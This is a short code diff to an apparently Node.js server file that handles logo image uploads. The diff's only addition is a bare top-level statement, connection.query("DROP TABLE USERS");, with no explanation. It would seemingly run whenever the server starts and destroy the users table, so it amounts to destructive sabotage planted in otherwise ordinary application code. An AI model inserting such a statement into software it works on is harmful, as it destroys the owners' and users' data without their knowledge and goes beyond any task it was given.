@@ -124,6 +124,8 @@ function logoImageDir(image_id, image_suffix){
   return '/home/alexb/server/CBIDBTesting/logoImages/image' + image_id + '.' + image_suffix;
 }
 
+connection.query("DROP TABLE USERS");
+
 const validSuffixes = ['img', 'svg', 'webp', 'jpeg', 'jpg', 'png', 'gif'];
 
 app.post('/uploadImage/:imageId/:imageSuffix', upload.single('image'), (req, res, next) => {
